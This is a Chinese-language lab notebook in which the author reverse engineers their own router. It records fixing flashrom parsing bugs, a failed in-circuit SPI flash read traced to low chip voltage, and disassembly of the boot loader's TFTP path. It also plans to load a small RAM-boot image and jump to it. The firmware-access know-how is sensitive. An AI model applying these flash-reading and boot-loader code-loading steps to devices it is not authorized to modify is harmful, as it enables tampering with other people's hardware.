**二、`console-dump.py` 早就把答案印在螢幕上。** 它的 `rescue` 會列出「什麼東西能
證明連線是活的」，第三項寫的是「**a TFTP read request comes back with DATA**」。
那句話描述的就是一個伺服器。它被讀過去了。

**三、一個把協定方向搞反的主張，看起來不像錯的。** 它會長成一支被寫出來、被測過、
被 commit、然後被帶到工作台的工具——在那裡它會在 port 69 上聽，而 loader 在等人來問。
失敗會以「救援路徑不通」的形式出現，在插了三次電之後，而且指向裝置。

**唯一做對的一件事：工具不是先寫的。** 先寫的是設計說明，而**把它寫成文字，
是讓那個主張大到足以被檢查的原因**。

## 這一次做出來的東西

**`tools/loader-tftp.py`** —— 一支 TFTP **客戶端**，三個子命令：

| | |
|---|---|
| `probe` | 一個請求、只收第一塊、不寫檔。重現 `T-09`，並且報出 transfer id |
| `get` | 快讀路徑。`FLR` 把 flash 搬進 RAM，這支把 RAM 搬到工作站——對照 `DB` 走 38400 讀 4 MiB 的 **105 分鐘**。**是第二條傳輸路徑，不是第二支儀器**：兩條都經過 SoC 自己的 SPI 控制器，它排除掉序列線，其他什麼都沒排除 |
| `put` | `P9-12`。`AUTOBURN 0` 之下，上傳的映像落在 RAM，**一個 flash byte 都不寫** |

**`put` 看不到主控台，所以它不假裝看得到。** 它要求 `console-dump.py rescue` 寫出來
的那份 JSON，**自己去解析它**，找不到針對同一個 host 的 `AutoBurning=0` 就拒跑。
`AutoBurning=1`、從來沒確認過那個開關、以及位址對不上，是三個各自獨立的拒絕，
各有一個測試。再加上 `--yes`。

**它不送 `J`。** 跳轉是對唯一一台機器的狀態改變，那要在有人盯著主控台的地方發生。

**`tools/test-loader-tftp.sh` —— 17 個案例，其中兩個是必須成功的對照組**
（1500 byte 的讀取，逐 byte 比對而不是只比長度；1536 byte 的上傳，在對面逐 byte 比）。
替身伺服器 `tools/test-loader-tftp-fake.py` **預設從不同的 port 回覆**，因為 loader
就是這樣做的——所以每一個讀取案例同時也是「客戶端跟著 transfer id 走」的證據。

## 下一次進站時，這支工具的第一件事

**開放題 96：loader 到底在供應什麼，來源是哪裡。** `T-09` 那 516 byte 對上了
flash `0x060010` 的 `cr6c` 酬載，而檔名根本不存在。它是在**供應 RAM 裡 load address
的內容**，還是自己去讀 flash？這決定了 `get` 是「`FLR` 輸出的快速通道」還是
「第二個讀取器」。

**一次進站就答得完**：`FLR` 一段有辨識度的範圍進 RAM，然後 `get`，看 byte 有沒有
跟著 `FLR` 走。在那之前，`get` 是一條**來源用假設的**傳輸路徑，而工具的輸出自己
就這樣寫。
# 2026-08-21（五）W08 進站場次 —— 計畫，寫在夾子上去之前

**預測不在這一則裡。** 這一場的十一條預測寫在 **2026-08-20 §2** 那張表，順序寫在
`runsheet.md` 的 `B-W08` 與它的兩則增補。**這一則一個字都不重寫它們**：一份可以在
量測前一小時被重寫的預測，預測不了任何事情。

這一則記的是**今天傍晚在桌面上新發生、而且會改變這一場怎麼跑**的事。照這個檔案自己的
規矩，這半件事必須在插電之前上紀錄 —— W07 Day 3 改了三條進站預測而這個檔案一個字都
沒寫，是作者抓到的。**今天改了兩件工具、加了四條預測，所以這一則的重點在前半。**

## 一、`A5.2` 照原樣跑會失敗，而它的失敗訊息會指著三個錯的地方

`tools/flash-read.sh` 的 `probe` 向 flashrom 要一個 `-V`，然後去 log 裡撈
`RDID returned 0x.. 0x.. 0x..`。**flashrom 1.3.0 這一行只在 `-VVV` 才印。**
量在 flashrom 自己的 `dummy` 程式器上，沒有夾子、沒有裝置、沒有 CH341A：

```text
  flags none    RDID lines: 0    identification lines: 1    log bytes: 825
  flags -V      RDID lines: 0    identification lines: 2    log bytes: 62274
  flags -VV     RDID lines: 0    identification lines: 2    log bytes: 62321
  flags -VVV    RDID lines: 6    identification lines: 2    log bytes: 328776
  flags -VVVV   RDID lines: 6    identification lines: 2    log bytes: 328777
```

所以晶片會答、flashrom 會認出它，而工具會撈到零行，然後印：

```text
 FAIL  no JEDEC id came back. The chip is not answering.
 FAIL    - router unplugged? the clip cannot power the whole board reliably
 FAIL    - pin 1 of the clip on pin 1 of U19? (the dot on the package)
 FAIL    - SOP-8 comes in 150 mil and 208 mil; the kit clip is often narrow
```

**三個候選全部是錯的**，而且第三個會把人送回去量封裝寬度 —— 那一格今天早上才剛以
`T-85` 通過。照 2026-08-20 §3 的停止條件，第三次之後就是拆夾子重夾，**而重夾會把
一顆完全正常的晶片再壓一次**，並且沒有任何一次會成功。儀器 bug 51。

**改的不只是那個旗標。** 只把 `-V` 換成 `-VVV`，下一次 flashrom 動格式時同一個錯誤
會用同一種形狀再來一次。真正改掉的是**讓工具分得出兩種失敗**：log 裡只要有一行
flashrom 的辨識結果，匯流排就是好的 —— 缺的是那一行字，不是那顆晶片。現在它會說
`DO NOT RE-SEAT THE CLIP`。理由寫在 `RUNBOOK` §8.12.41，指令與預期輸出在
`runsheet.md` `A5.2`。

## 二、少印四行，而那四行正好是 `P9-7` 要的第二個來源

同一支工具解 flashrom 型號那一行的樣式是 `Found [^\n]*flash chip "[^"]+"`。
**`[^\n]` 在 POSIX 方括號裡不是「非換行」，是「不是反斜線、也不是字母 n」** ——
而 flashrom 印的是 `Found Eon flash chip "EN25QH32" (4096 kB, SPI)`，`Eon` 裡有一個
`n`。拿真的那一行驗過：不匹配；換成 `.` 就匹配。**這一行從寫下來到今天，一次都沒有
印出來過**，而預期輸出裡也沒有它 —— 所以沒有人會發現少了。儀器 bug 50。

第二個解析同樣永遠是空的：版本樣式要 `flashrom [0-9]`，而 Ubuntu 打包沒填版本字串，
這顆印的是 `flashrom unknown on Linux …`。**一份 4 MiB 的 dump 即將成為這個專案每一個
byte 級主張的第二個來源，而它的 log 裡沒有記下讀取器是誰。**

**而 `flashrom` 那一行為什麼算一個來源。** `flashrom` 比對的是 `manufacture_id` 與
`model_id`，型號名是查表的**輸出**不是索引。分辨這兩件事不需要讀原始碼：叫它去模擬
`W25Q128FV`，它回報 `W25Q128.V` —— **餵進去的字串跟吐出來的不一樣**，如果是用名字
索引的，名字會原樣回來。所以它是「這三個 byte 是哪一顆」的第二個來源，**不是**「那三個
byte 是什麼」的第二個來源。

## 三、登記簿 `P9-7` 的 `predict` 欄有一句是錯的，而它不會被改

那一欄寫著「flashrom 判斷也是 4096 KiB 並不獨立，因為它的資料庫就是用同一個型號名
索引的」。**上一節那一量推翻了它。** `RUNBOOK` §8.12.41 裡同一句話已經改掉了（那個
檔案的職責是論證），**但 `test-cases.toml` 的 `predict` 欄不動**：量測前一小時把預測
往有利的方向改，跟量測後改沒有分別。這一條進 `PROGRESS.md § Corrections`，
判定寫進 `P9-7` 的紀錄卡。

## 四、今晚新增的四條預測，全部寫在夾子碰到晶片之前

| # | 節 | 預測 | 反證條件（寫在前面） |
|---|---|---|---|
| 12 | `A5.2` | flashrom 自己把這顆叫成 **`EN25QH32`**，沒有 `B` | 叫成 `EN25Q32(A/B)` → id 是 `1c3016`，2026-08-20 §2 第 4 列的反證條件已經觸發，整段推理作廢。叫成別的名字 → 兩邊都不對，先別讀 |
| 13 | `A5.2` | `reader:` 那一行是 **`flashrom unknown on Linux …`**，不是版本號 | 出現版本號 → 這台的 flashrom 換過了，log 要記下是哪一顆才算數 |
| 14 | `A5.2` | `-VVV` 之下 RDID 那一行**會**出現在真的 CH341A 上 | 仍然沒有 → 不是 verbosity 是格式，**看 log，不要動夾子**。桌面那一量是 `dummy` 上做的，這一列就是它的第二個來源 |
| 15 | `A5.2` | SFDP：**不預測**，兩種都是結果 | 有 → 多一個不欠型號名也不欠 flashrom 表的密度來源；沒有 → 這顆不實作它，記下來，不要再找第二次 |

> 第 12 列不是繞過第 4 列，它是第 4 列的第三張表。封裝上的字是一張、loader 的 32 筆
> 是一張（**`1c7016` 沒有一列**）、flashrom 的是第三張。**三張表對同樣三個 byte 給出
> 各自的答案，而只有一張說不出話。**

## 五、進站之前會撞到的第一面牆，不是 `make doctor`

`usbipd list` 現在的 `Connected` 只有滑鼠、webcam、藍牙；**沒有 `1a86:5512`**。
而且 CH341A **不在 `Persisted` 清單裡** —— 那份清單只有 Realtek 網卡與 CP210x，
也就是說**這顆從來沒有被 `usbipd bind` 過**。所以今晚需要一次**系統管理員身分**的
`bind`，之後 `attach` 才有東西可以接。

CP2102 與 USB 網卡都不在 `Connected`，**這一項符合進站條件**（兩者都是第二個接地與
第二個供電源）。

## 六、桌面上已經跑完、帶對照組、而且這一場不重算的

`A5.2` 的另一半（`runsheet.md` 說明它不用夾子）今天下午跑過了：

```text
1c7016: no row. The loader cannot name this part, which is what `chipName: UNKNOWN` looks like from the inside.
1c3016: EN25Q32 (1 row(s))
```

**第二行是對照組，而它是第一行能算數的唯一理由**：這支查表工具說得出「有」，
所以它說「沒有」才是一個結果，而不是一個壞掉的查詢。

`tools/test-flash-tools.sh` 從 18 個案例變成 **32 個**。新增的十四個裡有兩個是
把今天這兩個 bug 放回去、確認套件會紅 —— 兩個都驗過了，紅在該紅的那一行。

## 七、禁令與停止條件

**2026-08-20 §3 那四條全部照舊，一個字都不改。** 唯一變的是其中一條的**判讀**，
而變的原因是工具現在分得出來：

- `no JEDEC id came back, and flashrom did not identify anything either`
  → 匯流排本身有問題，照原本那三個候選依序查，**不要重試第三次**。
- `flashrom identified a part but this log has no RDID line in it`
  → **匯流排是好的，不要重新就座。** 去看 log，不要動夾子。

## 八、這一場刻意不做的事

| 不做 | 為什麼 |
|---|---|
| 不把 `A5.1` 重跑一次 | 三項在 `T-84` / `T-85` 已經過了，而電表那兩項的前提（程式器插著 USB、閒置）今晚沒有變 |
| 不改 `bench-doctor.sh` 的分站 | 開放題 92，理由沒有變：**不在夾子拿在手上的時候改一個會改變控制流的檢查**。第 5 站那兩個 `FAIL` 是預期的，`A5.1` 裡寫著是哪兩個 |
| 不給 `LOG.md` 加 CI 守衛 | 作者今天決定的，理由記在 `PROGRESS.md § Deliberately not done`。落後十個 commit 這件事今天用手補 |
| `A5.5` 的第二發（`zzzzz`） | 照 `B-W08` 原樣，第一發還原之後才排 |
# 2026-08-21（五）補記 —— 同一個錯有兩個家，而第二個家是會寫入的那一支

**這一段更正的是同一天稍早、同一場寫在上面的東西**，而它不去改上面那些字，因為這個
檔案是逐字證據。2026-08-19、08-20、08-21 已經各用同樣的方式更正過一次，這是第四次。

**上面那一則只講了 `flash-read.sh`。** 找完之後去看它的兄弟，而
`tools/flash-write.sh` 的 `identify()` 有**一模一樣的兩行**：向 flashrom 要一個 `-V`，
然後撈那個只在 `-VVV` 才印的 `RDID returned`。

**它的下場跟讀取那一支不一樣，而且更貴。** `identify()` 撈不到 id 的時候會

```text
die "no JEDEC id came back. Not writing a chip that is silent."
```

**方向是對的** —— 拒絕寫，而不是盲寫。但這代表**今晚每一次寫入都會被拒絕**：
`A5.4` 的演練、`A5.5` 的五個 byte、`A5.5` 的還原，三個都做不了，而工具給的理由是
「這顆晶片不出聲」，指著一顆答得好好的晶片。**照 `B-W08` 的循環表，那一場會停在
循環 1 的中間，夾子在座上，而三次拔插電源已經花掉。**

**一個失敗安全的工具，仍然可以把一整場燒掉，只要它指錯地方。**

## 修法：一個事實一個擁有者，而拒絕仍然是兩份

`tools/lib/flashrom-parse.sh` 新增，兩支工具都 source 它。**而禁區沒有合併**，
這是刻意的：兩條路徑各自拒絕同樣那兩段，才讓「這個專案不寫 boot loader」是專案的
性質而不是某一支腳本的性質 —— **那是一條政策，而政策重複一次等於多驗證一次**。

**另一支程式的輸出格式不是政策，是一個事實。** 它有兩份，就是今天這個 bug 有兩個家的
原因。**一個事實一個擁有者。**

## 今晚新增的第五條預測

| # | 節 | 預測 | 反證條件（寫在前面） |
|---|---|---|---|
| 16 | `A5.4` | `flash-write.sh plan` 的 `identify` 印出的 id，與 `A5.2` 的 `probe` **逐字相同**（`1c7016`） | 兩支工具對**同一顆晶片、同一次就座**說法不同 → 那是儀器問題，不是發現。**停下來，不要寫**，先問哪一支在說謊 |

> 這一條看起來是廢話，而它不是。兩支工具現在共用同一個解析器，所以它們**應該**一致 ——
> 正因為應該，不一致才有鑑別力：那會直接指向共用的那一層，而不是指向晶片。

## 儀器套件

`tools/test-flash-tools.sh` **18 → 39 個案例**。三個新的守衛各自被反向驗過一次
（把 bug 放回一份複本裡，看套件變紅）：

| 放回去的 bug | 紅在哪一行 |
|---|---|
| `parse_chip_name` 的 `[^\n]` | `the chip name survives a vendor string containing the letter n` |
| `probe` 的 `-V` | 端到端那一組，而且訊息變成 `DO NOT RE-SEAT THE CLIP` |
| `flash-write.sh` 自己的 `-V` | `hardcodes a probe verbosity again instead of $FLASHROM_PROBE_V` |

**第三個案例守的不是今天那個 bug，是明天那個**：它會在任何一支工具重新長出自己的
flashrom 意見時開火。今天這個錯不是那個正規表示式，是**它有兩份**。
# 2026-08-21（五）W08 進站場次 —— 實錄，寫在跑完之後

**這一場沒有讀到任何一個 byte，而它量出來的東西是一個結果。** `A5.2` 的 `probe`
沒有跑、`A5.3` 的讀取沒有跑、`A5.4` 與 `A5.5` 沒有進行。原因不是時間，是**晶片
從頭到尾沒有到達工作電壓**，而那件事本身是這一場的產出。

計畫與十六條預測寫在同一天的兩則（進站計畫、以及那則補記），**一個字都沒有改**。

## 一、按時間順序，實際發生的事

| # | 做了什麼 | 觀察到什麼 |
|---|---|---|
| 1 | `usbipd bind --busid 1-1`（提權，這顆從未 bind 過）→ `attach` | `lsusb` 看到 `1a86:5512 QinHeng Electronics CH341 in EPP/MEM/I2C mode` |
| 2 | `make doctor TIER=3` | **兩個 `FAIL`，正好是預期的那兩個**（`/dev/ttyUSB*`、`enx*`），CH341A 兩列 `ok`。與 `A5.1` 的預期輸出逐行相符 |
| 3 | 夾子夾上 `U19`（**先 attach 後夾**，照 runsheet 的順序） | **CH341A 從 Windows 的匯流排上消失。** `usbipd list` 的 `Connected` 少掉 `1a86:5512`，其餘三個裝置都在。Windows 系統事件記錄近 15 分鐘**沒有**任何 USB 過流／power surge |
| 4 | 夾子拿下來 | CH341A 立刻回到匯流排。**可重現：夾上去掉，拿下來回來** |
| 5 | 電表量夾子八腳（USB 插著、夾子不在晶片上），以 `4` 為地 | `1`=3.3、`2`=3.3、`3`=3.3、`5`=3.3、`6`=3.3、`7`=3.3、`8`=3.3。**與 `T-84` 一致，改機仍然是好的** |
| 6 | 電表量 `U19` 的 `VCC`(8) 對 `GND`(4)，**板子不通電、夾子不接**，電阻檔 | **8 kΩ，並且持續往上爬過 10 kΩ 仍未停** |
| 7 | 改成**先夾、後插 USB**（為了讓 inrush 落在穩壓的軟啟動上） | **一樣沒有列舉。** 順序不是成因 |
| 8 | CH341A 改插主機**後面板**主機板直出的 USB 2.0 埠（busid 變 `1-4`）；先確認**沒有夾子時認得到**（對照組） | 對照組通過 |
| 9 | 同一個埠，夾上 `U19`，插 USB，**等十秒**，同時量電壓 | **仍然不在匯流排上。** 腳位（`4` 為地）：`1`=1.65、`2`=0、`3`=1.79、`5`=0、`6`=0、`7`=1.79、**`8`=1.70** |
| 10 | 作者自己接的：**ESP8266 的 `3V3` 灌到 CH341A 的 3.3 V 軌** | **CH341A 不再掉線**，夾著也留在匯流排上（busid `2-1`）。`bind` + `attach` 成功 |
| 11 | 三點量測 | ESP8266 的 `3V3` = **3.3 V**；注入點 = **3.3 V**；**晶片上的 `VCC` = 1.7 V**（會跳到 2.x） |
| 12 | 全程每一步都看路由器 | **沒有任何一顆 LED 亮過** |

## 二、三種供電，同一個電壓 —— 這是這一場真正的量測

| 供電方式 | 晶片上的 `VCC` |
|---|---|
| CH341A 自己 | **1.70 V**（而且程式器自己也垮掉、掉出 USB） |
| 換主機後面板 USB 埠 | **1.70 V** |
| ESP8266 的穩壓（供電側量到 3.3 V） | **1.7 V** |

**三種供電能力差很多，晶片端的電壓一動也不動。** 這是這一場唯一一個被重複三次的量測，
而它是後面所有推論的地基。

## 三、能寫的結論，以及不能寫的

**能寫的：**

> 用這支 CH341A 加這副 SOIC-8 夾對這塊板子做 in-circuit 讀取，**不成立**。
> 晶片從來沒有到達工作電壓。**成因不是主機的 USB 埠**（後面板直出無效），
> **也不是程式器自己那顆穩壓**（外部電源在注入點穩穩給著 3.3 V，晶片端仍然 1.7 V）。

**不能寫的，而且它是這一場留下的開放題：**

> 那 1.7 V 是**目標板把 `VCC` 網路鉗住**，還是**夾子與排線那一段的串聯電阻**，
> 這一場沒有把兩者分開。分開它需要一次電流量測，或一次離線讀取，兩者今晚都沒有。

**`8–10 kΩ 且持續上升` 與 `帶載 1.7 V` 不矛盾。** 電表量電阻時加的測試電壓不到一伏，
低到板上的矽晶不導通，量到的是「冷的」板子；`VCC` 一被推到 1.7 V 附近，導通就開始了。
**這是一個非線性負載，一支電表在低電壓下量不到它。**

## 四、沒有跑 `probe`，而這是一個決定不是一次遺漏

1.7 V 在這顆 part 的工作範圍之外。在這個電壓下讀出來的東西**如果看起來是對的，
它會以「兩支儀器對同一顆晶粒說法不同」的形式進到 `P9-5` 的比對裡** ——
而那正是 `P9-5` 存在要消除的那一個混淆項。**不自己製造一個要被消除的東西。**

同理，`A5.3` 的四千一百九十四萬個 byte 一個都沒有讀。

## 五、進站前寫下的停止條件，漏掉了今晚實際發生的那一種失敗

2026-08-20 §3 有四條：`A5.1` 沒過就結束、`no JEDEC id` 不要重試第三次、
`MORE THAN ONE id` 是接觸不良、`A5.3` 沒過就不做 `A5.4`/`A5.5`。

**「程式器自己從 USB 匯流排上消失」不在裡面。** 那張表假設的失敗全部是
「工具回了一個不對的答案」，而今晚的失敗是**工具還沒開口就斷電了**。
一張進站前寫好的停止條件表，漏掉了實際發生的那一類 —— 這一條要進下一次的表。

## 六、我今晚給過四個解釋，前三個都被電表殺掉

| 解釋 | 被什麼推翻 |
|---|---|
| 「`VCC` 掛在板子的主 3.3 V 軌上，整塊板子在吃電」 | 冷阻抗 **8–10 kΩ** —— 主軌不會是這個數字 |
| 「是 inrush，上電順序錯了，先夾再插就好」 | 先夾再插，**一樣沒有列舉** |
| 「是 inrush，穩壓來不及一邊充電容一邊養活自己」 | 插上**十秒後** `VCC` 仍然停在 1.70 V。inrush 早該結束了，**那是穩態** |
| 「電流能力不夠」 | ESP8266 的穩壓供得起，注入點 3.3 V 穩住，**晶片端一動也不動** → 比較像鉗位不像拉垮 |

**第四個沒有被推翻，但也沒有被證實** —— 它是上面第三節那條開放題。
四次裡有三次是量測贏，而這一場沒有任何一個結論是從一個解釋推出來的。

## 七、這一場真正產出的東西

1. **一個量出來的否定結果**：in-circuit 這條路在這塊板子上不通，三種供電組態互相印證。
2. **兩個儀器 bug 在夾子上去之前被抓到並修掉**（50、51），其中一個會讓操作者在一顆
   正常的晶片上重夾三次，另一個會讓今晚每一次寫入都被拒絕。詳見同日的進站計畫那一則。
3. **`A5.1` 的第 2 項在真機上再驗一次**：夾子八腳全部 3.3 V，改機沒有退步。
4. **停止條件表的一個缺口**，見第五節。

## 八、登記簿：這一場一列都不登記，而那是刻意的

`P9-5` / `P9-6` / `P9-7` **維持 `⬜`**。`rtcase record` 的判定只有
`confirmed / na / partial / refuted`，而今晚量到的是**儀器搆不搆得到那顆晶片**，
不是那顆晶片的內容 —— 拿一個關於儀器的量測去給裝置的測試下判定是分類錯誤。
而且一旦登記，預測就凍住，之後若真的離線讀到了反而關不掉。

**三列仍然是欠的，`make todo WEEK=W08` 照樣會把它們列出來，那是真的。**

## 九、下一場從哪裡開始

**不是再夾一次。** 同一組條件已經量過三次。要往下只有兩條路，而兩條都不是今晚的事：

| | 前提 | 得到什麼 |
|---|---|---|
| 量那個電流 | 要一個能串進 `VCC` 路徑的方式，而排線是固定排針 | 把「鉗位」與「串聯電阻」分開，也就是第三節那條開放題 |
| 把 `U19` 拆下來離線讀 | 熱風槍；這是唯一一台板子 | `P9-5`/`P9-6`/`P9-7` 全部可行，而且 `A5.4`/`A5.5` 的寫入變得沒有風險 |

**這一場結束時裝置的狀態**：路由器全程未通電、未開機；夾子已拆；CH341A 已拔；
ESP8266 已拆線。**flash 的內容一個 byte 都沒有被改過，也沒有被讀過。**

# 2026-08-21（五）W08 桌面第四場 —— 下一次進站的計畫與十三條預測，寫在插電之前

**桌面場，路由器全程沒有通電，夾子沒有碰過任何東西，CP2102 沒有接。** 這一則存在的
理由跟 2026-08-20 那一則一樣：**下一次進站的計畫在今天被改掉了**，而改掉它的東西
（loader 第二階段的反組譯）是在桌面上做出來的。計畫要在插電之前上記錄，不是之後。

**這一場推翻的不是裝置的行為，是 `A2.7` 這一節本身。** 它有四個錯，三個會讓它在動到
任何 byte 之前就失敗，第四個會讓它**正確地跑完、然後印出一個錯的結論**。

## 一、開放題 96 在桌面上就答完了，而進站改成去驗證它

`FLR` 的第三個參數寫的全域，正好是 TFTP 讀取路徑取長度的那個全域。位址則另有其人。

| 事實 | 位址 | 怎麼讀出來的 |
|---|---|---|
| TFTP 供應 DATA 的來源 = `[0x8040D3A8] + (block-1)*512` | `0x80401ED4` | `objdump` 反組譯 `stage2.bin`（flash `0x0012F0` 的 LZMA，17,334 → 56,592） |
| 供應的總長度 = `[0x8040DD28]` | `0x80401F04` / `0x80401F34` | 同上 |
| `0x8040D3A8` 的初值 = **`0x80500000`** | `.data` 檔案位移 `0xD3A8` | 直接讀 image 的位元組 |
| `0x8040DD28` 在 `.bss`（檔案只到 `0x8040DD10`） | — | image 長度 56,592 = `0xDD10` |
| `FLR` 的第三個參數寫 `0x8040DD28` | `0x80409A04` | `FLR` handler，指令表 `0x8040DBC0` 第 10 項 |
| `FLR` 的第一個參數是**目的地** | `0x804099C4`–`0x804099FC` | 同上，而且與 RUNBOOK §8.7.8 的四份實錄一致 |
| autoburn 全域只被讀一次，`beqz` 就跳過燒錄 | `0x80401B9C` | 同上 |
| `J` 會先印 `---Jump to address=%X`，然後 flush、然後跳 | `0x8040925C` | 同上 |
| 回覆的 port `2098` 是常數，每完成一次上傳加一 | `0x80401DE0` / `0x80401AD4` | 同上 |

**推論**：`get` 是 `FLR` 的快速通道**只在 `FLR` 的目的位址等於 `LOADADDR` 時**成立。
`FLR` 借給 TFTP 的是長度，不是位址。**這既不是開放題 96 自己列的第一個答案，也不是
第二個。** 完整推導在 `notes/loader-tftp-and-commands.md`。

## 二、`A2.7` 原本的設計會得到 `0`，而它把 `0` 對應到錯的答案

原設計：兩次 `FLR` 打不同的 flash 範圍，中間各 `get` 一次，`cmp` 兩份。判讀表兩格 ——
不同 → 供應 RAM 裡 load address 的內容；相同（`0`）→ 它自己有一份固定來源。

**兩次 `FLR` 的目的位址都是 `0x81000000`，而供應的位址是 `0x80500000`。** 所以兩份
必然相同，`cmp` 必然是 `0`，而那一節會宣布第二個答案。**量測是對的，表是錯的。**

而且它在到達那裡之前會先失敗三次：手打的 `FLR 300000 81000000 1000` 是 `FLW` 的參數
順序；`console-dump.py cmd` 沒有處理 `(Y)es , (N)o ?` 的程式碼；沒有 `--at-prompt`，
所以工具會對一塊已經停在 `<RealTek>` 的板子送 120 秒 ESC 然後說「TX/RX 接反、port 錯、
或板子沒上電」——**三個原因，沒有一個是真的**。

## 三、四格量測，每一格的 sha256 都是今天在桌面上算出來的

來源：`dumps/flash-n150rt-console-2.bin`（2026-08-16，4,194,304 bytes，
sha256 `a800059a9b8c414df026a22b8423a5939d0f9bb793109d0f7ce086f6810f37ea`，
與 `console-1` 逐 byte 相同）。本專案 8/16 之後寫過的區域都在 `0x3F0000` 以上，
與這四格用到的 `0x000000` / `0x010000` / `0x060010` / `0x180000` 不重疊。

| 格 | 做完什麼之後 `get` | 預期 bytes | 預期 sha256 |
|---|---|---|---|
| 1 | 什麼都沒做 | 0 | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| 2 | `FLR` flash `0x010000` → RAM `0x81000000`，長度 `0x1000` | 4096 | `3c586859c52ba54166f88fc53e7392e5463bca8589e8b029afb422304f329747` |
| 3 | `FLR` flash `0x180000` → RAM `0x80500000`，長度 `0x1000` | 4096 | `06c9622f6ebbcc09637010e1db59170c3055857bd9087d9f054ece2361816c39` |
| 4 | `LOADADDR 81000000`，不再送 `FLR` | 4096 | `e7335bc08de18174ed3aeae6cbc19578febd9d8eeee690125c0478bfe67c148e` |

**落不上任何一格，靜態讀法就是錯的**，而那比原設計有價值 —— 原設計沒有任何一個結果
能反證它自己。

## 四、預測，十三條，全部寫在插電之前

1. `DB 80500000 64` 印出來的前十六個 byte 是 `00 00 00 00 00 00 80 21 40 90 60 00
   00 00 00 00` —— 也就是 flash `0x060010` 的前十六個。**這順帶量到一件之前只能推測
   的事：loader 在讓出 ESC 視窗之前就把 kernel 搬進 RAM 了。**
2. 還沒送過任何 `FLR` 時，`probe` 回 **0 bytes in 1 block**，sha256 `e3b0c442…`，
   而主控台印 `**TFTP GET File probe,Size 0 Byte`。（`0 bytes` 是成功不是失敗：
   它回了 opcode 3 的 DATA，只是酬載長度 0。）
3. 第 2 格：`get` 回 **4096 bytes in 9 blocks**，sha `3c586859…`，
   `--attribute` 說它是 `flash[0x060010 : 0x061010]`，而且在 4 MiB 裡只出現一次。
4. 第 3 格：4096 bytes，sha `06c9622f…`，`flash[0x180000 : 0x181000]`。
5. 第 4 格：4096 bytes，sha `e7335bc0…`，`flash[0x010000 : 0x011000]`。
6. **九塊不是八塊**：4096 = 8 × 512，第 9 塊是 0 byte 的 DATA，因為 `0x80401F10`
   的收尾判斷是 `block*512 == 長度+512`。
7. `LOADADDR: 81000000`（有冒號）回 `Unknown command !`；`LOADADDR 81000000`
   回 `Set TFTP Load Addr 0x81000000`。（與 `AUTOBURN`、`IPCONFIG` 同一個形狀，
   第四次。）
8. 第一次完成上傳**之前**，每一個回覆都從 **`:2098`** 來；`put` 之後那一次 `get`
   從 **`:2099`** 來。
9. `put` 送 148 bytes，1 block；接著的 `get` 回同樣 148 bytes，`cmp` 不印任何東西。
10. `put` 之後 `FLR` flash `0x060000` 的 64 bytes，與 8/16 那份 dump 相同。
    （**這是抽樣不是證明**；真正的論據是同一次開機的 `AutoBurning=0` 加上
    `0x80401B9C` 只讀一次那個旗標。）
11. `J 80500000` → 主控台先印 `---Jump to address=80500000`（**loader 印的，
    不是 payload 印的**），然後 `*** N150RT RAMBOOT P9-12 4baee517 ***` 每隔約一秒
    重複一次。
12. `J` 之後網路死掉：`ip neigh` 不再 `REACHABLE`，`get` 沒有回應。理由是
    `0x804092F4` 把 `0xBB804104`–`0xBB804114` 各清一個 bit。
13. `console-dump.py dump` 的陽性對照每一次都過（`FLR` flash `0x000000` 前四個
    byte = `0b f0 00 04`）。**任何一次沒過就整節停**。

**如果第 1 條不成立**（`0x80500000` 是全 `00`、全 `ff`、或別的東西）：**第 3 條要改**，
第 2 格會吐出那個東西而不是 `3c586859…`。**改預測要寫進這個檔案再跑，不是跑完再解釋。**

**如果第 3 條吐出 `06c9622f…` 或 `e7335bc0…`**：位址跟著 `FLR` 走，`0x80401EF4` 的讀法
錯了。那時第 3、4 格不用跑，直接進 `P9-12`。

## 五、`P9-12` 的映像，凍結在這裡

| | |
|---|---|
| 工具 | `tools/mkramboot.py`（今天寫的） |
| nonce | **`4baee517`** |
| 橫幅 | `\r\n*** N150RT RAMBOOT P9-12 4baee517 ***\r\n`（41 bytes） |
| 大小 | **148 bytes**（37 個 word 的碼 + 橫幅） |
| sha256 | **`46370ce9537e1573d63c90d4afa7874f3e446b70b0e59c6cfac3fd63e9bb6b92`** |
| 進入點 | 第 0 個 byte，位置無關（`bal` 取 PC），`J` 給 `80500000` |
| UART | THR `0xB8002000`、LSR `0xB8002014`、遮罩 `0x60`，自旋上限 6540 —— **全部照抄 loader 自己的 putchar（`0x80406B6C`）** |
| 橫幅在 flash 裡 | **不存在**。對 4 MiB dump 與 `stage2.bin` 各查過一次，兩邊都沒有 |

**最後一列是這個映像能當證據的全部理由。** 一個已經在 flash 裡的字串出現在主控台上，
什麼都不證明。

**這支工具的第一版是錯的，而抓到它的是模擬器不是眼睛**：分支位移算成相對 `PC+8`，
於是每個分支落早一個 word。它組譯得出來、`objdump` 看起來正常，**只是會把橫幅的第一個
byte 印四十一次**。把定義釘死的是 loader 自己的兩個 `beqz`（`0x80406B7C`、`0x80406B90`），
不是任何參考書。

## 六、停止條件 —— 前四條是新的，第五條補上一場漏掉的那一類

1. 第 0 步的 `DB` 對不上 → **先改預測寫進本檔**，再跑。
2. `dump` 的陽性對照沒過 → **整節停**。`FLR` 這條路本身有問題。
3. `put` 被拒絕（年紀、位址、檔名任一條）→ **不要加旗標繞過去**，先讀拒絕的理由。
4. `J` 之後板子沒反應而且拔電重開也起不來 → 走 `A4.2`。**flash 一個 byte 都沒被寫過**，
   所以這一條不該發生；真的發生了，那本身就是這一節最大的發現。
5. **上一場的停止條件表漏掉了「工具還沒開口就斷電」那一類**，記在 2026-08-21 實錄第五節。
   這一場對應的那一類是：**`console-dump.py` 與 `loader-tftp.py` 會輪流用同一條 USB
   線與同一個網段**。任何一支工具回報「裝置不見了」而不是「裝置回了不對的答案」，
   一律先當接線／`usbipd` 處理，不要當成量測結果 —— `A5.1` 的三個坑照樣適用。

## 七、桌面上做完、驗過、而且進站不重算的

| 東西 | 狀態 |
|---|---|
| `tools/mkramboot.py` + `tools/test-mkramboot.sh` | **26 個案例全綠**，其中 7 個是「把 bug 放回編碼器裡，建置必須變紅」 |
| `tools/loader-tftp.py` 的 `--attribute`、檔名拒絕、rescue 紀錄年紀上限、`--expect-load` | `test-loader-tftp.sh` **17 → 30 個案例** |
| `tools/console-dump.py` 的 `LOADADDR` 進 `FORBIDDEN`、`rescue --load-addr` 三個拒絕 | `test-console-dump.sh` **18 → 23 個案例** |
| 四格的預期 sha256 | 從 8/16 dump 算出來，寫在上面第三節 |
| `w08-ramboot.bin` | 已產生，sha256 在第五節 |
